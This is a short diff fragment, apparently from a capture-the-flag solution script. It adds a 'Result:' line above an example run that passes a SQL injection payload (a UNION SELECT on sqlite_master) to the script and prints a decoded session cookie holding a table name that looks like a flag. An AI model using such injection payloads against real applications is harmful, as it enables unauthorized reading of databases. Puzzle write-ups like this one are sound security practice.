@@ -18,6 +18,7 @@ b64str = r.cookies['SESSION']
 print base64.b64decode(b64str)
 
 '''
+Result: 
 $ python sqlite.py "' UNION SELECT tbl_name,null,null FROM sqlite_master-- -"
 
 ThisTableNameIsReallyLongItWouldTakeAgesTo8873d1ed62e1d8c2deb337b77365afd2BruteForceTheNameSoIHopeYouUsedAScriptAtLeastTheAnnoyingThingIsProbablyTheRandomBitInTheMiddle:is_admin=False:2015-03-09 12:44:800f545306a9f90c2bfafc7092defc97
